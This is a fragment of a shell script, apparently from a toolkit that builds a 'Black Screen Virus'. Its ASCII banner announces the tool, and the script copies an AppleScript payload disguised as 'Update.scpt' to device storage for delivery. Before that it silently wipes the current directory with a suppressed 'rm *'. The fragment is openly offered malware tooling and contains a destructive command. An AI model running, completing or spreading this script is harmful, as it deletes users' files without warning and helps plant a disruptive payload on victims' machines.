...
rm * >/dev/null 2>&1
cd $HOME
cp $HOME/vanish/core/src/mac/Update.scpt /sdcard/vanrc >/dev/null 2>&1
clear
echo -e "\e[91m
  ┌┐ ┬  ┌─┐┌─┐┬┌─┌─┐┌─┐┬─┐┌─┐┌─┐┌┐┌  ┬  ┬┬┬─┐┬ ┬┌─┐
  ├┴┐│  ├─┤│  ├┴┐└─┐│  ├┬┘├┤ ├┤ │││  └┐┌┘│├┬┘│ │└─┐
  └─┘┴─┘┴ ┴└─┘┴ ┴└─┘└─┘┴└─└─┘└─┘┘└┘   └┘ ┴┴└─└─┘└─┘"
echo
echo -e "   \e[91m[\e[0mThis virus make screen black.\e[91m]\e[0m"
